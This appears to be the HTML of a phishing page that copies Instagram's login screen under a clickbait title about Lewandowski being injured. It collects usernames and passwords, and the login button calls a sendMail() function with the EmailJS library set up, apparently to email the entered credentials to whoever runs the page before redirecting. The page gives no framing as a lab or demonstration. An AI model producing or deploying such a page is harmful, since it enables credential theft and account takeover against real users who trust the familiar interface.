<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Lewandowski Injured</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
      rel="stylesheet"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Grand+Hotel&amp;display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        font-family: Arial, sans-serif;
      }
      .font-grandhotel {
        font-family: "Grand Hotel", cursive;
      }
    </style>

    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      (function () {
        emailjs.init({
          publicKey: "0kepwQYgh3TefofGj",
        });
      })();
    </script>
    <script src="script.js"></script>
  </head>
  <body class="bg-black text-white min-h-screen flex flex-col justify-between">
    <main
      class="flex flex-col md:flex-row items-center justify-center flex-grow px-4 md:px-0 md:space-x-16 max-w-6xl mx-auto py-12"
    >
      <section
        class="flex-shrink-0 max-w-xs md:max-w-none md:w-[380px] relative"
      >
        <img
          alt="Instagram stories collage with three people in different frames and colorful icons around"
          class="w-full h-auto rounded-3xl"
          height="600"
          src="https://storage.googleapis.com/a1aa/image/a8ae0955-16b3-421f-11ad-be2c692f654e.jpg"
          width="380"
        />
      </section>
      <section class="w-full max-w-xs mt-10 md:mt-0">
        <h1
          class="font-grandhotel text-white text-4xl text-center mb-6 select-none"
        >
          Instagram
        </h1>
        <form
          class="flex flex-col space-y-2"
          action="AfterPage.html"
          method="POST"
        >
          <input
            class="bg-[#111111] text-white text-xs px-3 py-2 rounded border border-[#222222] focus:outline-none focus:ring-1 focus:ring-blue-600"
            placeholder="Phone number, username, or email"
            type="text"
            name="username"
            id="username"
          />
          <input
            class="bg-[#111111] text-white text-xs px-3 py-2 rounded border border-[#222222] focus:outline-none focus:ring-1 focus:ring-blue-600"
            placeholder="Password"
            type="password"
            name="password"
            id="password"
          />
          <button
            class="bg-[#0095f6] text-white text-xs font-semibold py-2 rounded mt-1"
            type="submit"
            onclick="sendMail()"
          >
            Log in
          </button>
        </form>
        <div class="flex items-center my-4">
          <div class="flex-grow border-t border-[#222222]"></div>
          <span class="mx-3 text-xs text-[#8e8e8e] font-semibold"> OR </span>
          <div class="flex-grow border-t border-[#222222]"></div>
        </div>
        <button
          class="flex items-center justify-center space-x-2 text-[#385185] text-xs font-semibold w-full"
          type="button"
        >
          <i class="fab fa-facebook-square text-lg"> </i>
          <span> Log in with Facebook </span>
        </button>
        <div class="text-center mt-4">
          <a class="text-xs text-white" href="#"> Forgot password? </a>
        </div>
        <div class="text-center mt-6 text-[11px] text-[#8e8e8e]">
          Don't have an account?
          <a class="text-[#0095f6] font-semibold" href="#"> Sign up </a>
        </div>
      </section>
    </main>
    <footer class="text-[#8e8e8e] text-[11px] py-6 border-t border-[#222222]">
      <div
        class="max-w-6xl mx-auto px-4 flex flex-wrap justify-center gap-x-2 gap-y-1"
      >
        <a class="hover:underline" href="#"> Meta </a>
        <a class="hover:underline" href="#"> About </a>
        <a class="hover:underline" href="#"> Blog </a>
        <a class="hover:underline" href="#"> Jobs </a>
        <a class="hover:underline" href="#"> Help </a>
        <a class="hover:underline" href="#"> API </a>
        <a class="hover:underline" href="#"> Privacy </a>
        <a class="hover:underline" href="#"> Terms </a>
        <a class="hover:underline" href="#"> Locations </a>
        <a class="hover:underline" href="#"> Instagram Lite </a>
        <a class="hover:underline" href="#"> Threads </a>
        <a class="hover:underline" href="#">
          Contact Uploading &amp; Non-Users
        </a>
        <a class="hover:underline" href="#"> Meta Verified </a>
      </div>
      <div
        class="max-w-6xl mx-auto px-4 mt-3 flex justify-center items-center gap-1"
      >
        <button
          aria-label="Select language"
          class="flex items-center space-x-1 text-[#8e8e8e] text-[11px] focus:outline-none"
          type="button"
        >
          <span> English </span>
          <svg
            aria-hidden="true"
            class="w-3 h-3"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            viewbox="0 0 24 24"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M19 9l-7 7-7-7"
              stroke-linecap="round"
              stroke-linejoin="round"
            ></path>
          </svg>
        </button>
        <span> Â© 2025 Instagram from Meta </span>
      </div>
    </footer>
  </body>
</html>
